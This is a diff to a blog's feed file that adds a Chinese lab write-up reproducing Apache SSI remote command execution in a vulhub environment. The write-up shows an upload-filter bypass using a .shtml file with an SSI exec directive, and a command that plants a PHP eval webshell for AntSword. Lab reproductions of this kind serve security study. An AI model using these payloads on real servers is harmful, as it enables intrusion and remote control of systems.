@@ -4,7 +4,42 @@
   
     
     <entry>
-      <title>Apache HTTP Server路径穿越漏洞(CVE-2021-41773)</title>
+      <title>Apache SSI 远程命令执行漏洞</title>
+      <link href="/2022/05/11/Apache-ssi-rce/"/>
+      <url>/2022/05/11/Apache-ssi-rce/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/ssi-rcedocker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先我们先看一下源代码</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511191838904.png" alt="image-20220511191838904"></p><p>禁止上传php文件，此时可以上传<code>shtml</code>文件</p><p>打开<code>http://192.168.3.151:8080/upload.php</code></p><p>上传一个<code>.php</code>文件</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192221119.png" alt="image-20220511192221119"></p><p>抓包</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192243589.png" alt="image-20220511192243589"></p><p>改成<code>1.shtml</code>，内容改成</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--<span class="token comment" spellcheck="true">#exec cmd='whoami'--></span></code></pre><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192420061.png" alt="image-20220511192420061"></p><p>上传成功，此时我们访问一下<code>http://192.168.3.151:8080/1.shtml</code></p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192451006.png" alt="image-20220511192451006"></p><p>成功执行命令，此时可以写入一句话木马</p><p>构造写入一句话木马的命令</p><pre class=" language-Linux"><code class="language-Linux"><!--#exec cmd="echo '<?php @eval($_POST["hack"]);?>' > ./hack.php"--></code></pre><p>上传！</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194326949.png" alt="image-20220511194326949"></p><p>然后访问<code>1.shtml</code></p><p>访问之后用蚁剑连接</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194440409.png" alt="image-20220511194440409"></p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194450036.png" alt="image-20220511194450036"></p><p>结束！！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> Apache </tag>
+            
+            <tag> httpd </tag>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Apache HTTP Server路径穿越漏洞</title>
       <link href="/2022/05/10/Apache-HTTP-Path-traversal/"/>
       <url>/2022/05/10/Apache-HTTP-Path-traversal/</url>
       
